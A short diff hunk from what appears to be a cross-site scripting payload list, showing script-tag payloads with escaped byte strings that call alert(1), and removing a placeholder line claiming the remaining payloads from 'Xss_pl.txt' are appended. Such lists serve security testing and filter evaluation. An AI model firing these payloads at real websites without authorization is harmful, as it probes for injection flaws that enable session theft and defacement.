@@ -138,4 +138,3 @@ javascript:alert(1)
 <script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
-... (truncated for brevity, but all unique payloads from Xss_pl.txt are appended here)
